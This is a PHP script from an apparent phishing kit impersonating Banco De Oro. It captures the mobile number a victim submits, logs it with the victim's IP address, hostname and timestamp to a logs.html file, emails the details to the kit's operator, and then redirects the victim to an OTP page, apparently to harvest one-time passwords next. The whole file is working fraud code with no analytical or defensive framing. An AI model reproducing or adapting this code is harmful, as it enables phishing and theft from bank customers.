<?php
$token = 0;
$ip = getenv("REMOTE_ADDR");
date_default_timezone_set("Asia/Manila");
$date = gmdate ("Y/m/d");
$dateHis = gmdate ("H:i:sa");

  $mobilenumber = $_POST['number'];
  $number = htmlentities($mobilenumber);

$msg .= gethostbyaddr($ip);
$msg .= "\n";
$msg .= "-------------------[Banco De Oro 2020]-----------------\n";
$msg .= "Mobile Number        : ".$number."\n";
$msg .= "Date     : ".$date." @ ".$dateHis."\n";
$msg .= "---------------------[Maria Clara]---------------------\n";
$file = fopen("../lib/logs.html","a+");
$table = "<font color='#00FFFF' size='2'>|  Mobile Number  : ".$number."</font><br><font color='#00FFFF' size='2'>|  IP             : ".$ip."</font><br><font color='#00FFFF' size='2'>|  Date           : ".$date." @ ".$dateHis."</font><br>";
fwrite ($file, $table);
fclose($file);

$subject = "New BDO Number ".$number."";
$headers = 'From: no-reply@email.com' . "\r\n" .
        'X-Mailer: PHP/' . phpversion();

$to = '';
mail($to, $subject, $msg, $headers);

header("location: ../otp1.php");
?>